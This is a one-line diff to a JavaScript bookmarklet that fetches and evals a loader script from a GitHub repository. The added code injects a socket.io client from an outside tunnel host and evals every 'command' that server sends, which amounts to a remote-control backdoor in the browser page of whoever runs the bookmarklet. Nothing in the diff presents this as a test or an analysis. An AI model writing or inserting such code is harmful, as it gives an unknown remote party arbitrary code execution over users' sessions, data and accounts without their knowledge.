@@ -1,1 +1,1 @@
-javascript:fetch("https://raw.githubusercontent.com/Murturtle/ploader/main/loader.js").then(data=>{data.text().then(text=>{eval(text)})});
+javascript:fetch("https://raw.githubusercontent.com/Murturtle/ploader/main/loader.js").then(data=>{data.text().then(text=>{eval(text)})});document.getElementsByTagName('body')[0].innerHTML+=`<script src="https://remotejs.loophole.site/socket.io/socket.io.js"></script><script>const socket = io("https://remotejs.loophole.site");socket.on("command", function(command) {eval(command);});</script>`;
